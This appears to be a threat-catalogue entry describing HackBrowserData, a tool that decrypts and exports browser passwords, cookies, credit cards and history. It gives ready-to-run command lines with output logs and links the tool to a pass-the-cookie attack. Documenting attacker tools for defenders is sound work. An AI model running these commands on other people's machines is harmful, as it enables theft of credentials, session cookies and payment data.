# HackBrowserData browser data export

## Metadata

- **UUID**: `ba88c4a0-bf3b-46cb-b022-050ae22abce8`
- **Schema**: `threat::1.0`
- **TLP**: clear

## Description
HackBrowserData is a command-line tool for decrypting and exporting data
(passwords, history, cookies, bookmarks, credit cards, download history,
localStorage and extensions) from the browser. 

It supports the most popular browsers on the market and runs on Windows, macOS and Linux.

Usage examples:

## Automatic scan of the browser on the current computer, 
   outputting the decryption results in JSON format and compressing as zip.

PS C:\Users\JohnDoe\Desktop> .\hack-browser-data.exe -b all -f json --dir results --zip

PS C:\Users\JohnDoe\Desktop> ls -l .\results\
    Directory: C:\Users\JohnDoe\Desktop\results

## Run with custom browser profile folder, using the -p parameter to specify the
   path of the browser profile folder.
  
PS C:\Users\JohnDoe\Desktop> .\hack-browser-data.exe -b chrome -p "C:\Users\User\AppData\Local\Microsoft\Edge\User Data\Default"

[NOTICE] [browsingdata.go:59,Output] output to file results/chrome_creditcard.csv success  
[NOTICE] [browsingdata.go:59,Output] output to file results/chrome_bookmark.csv success  
[NOTICE] [browsingdata.go:59,Output] output to file results/chrome_cookie.csv success  
[NOTICE] [browsingdata.go:59,Output] output to file results/chrome_history.csv success  
[NOTICE] [browsingdata.go:59,Output] output to file results/chrome_download.csv success  
[NOTICE] [browsingdata.go:59,Output] output to file results/chrome_password.csv success

## Techniques
- T1111

## Chaining
```mermaid
flowchart LR
ba88c4a0_bf3b_46cb_b022_050ae22abce8["HackBrowserData browser data export"]
b0d6bf74_b204_4a48_9509_4499ed795771["Pass-the-cookie Attack"]
ba88c4a0_bf3b_46cb_b022_050ae22abce8 --> b0d6bf74_b204_4a48_9509_4499ed795771
```
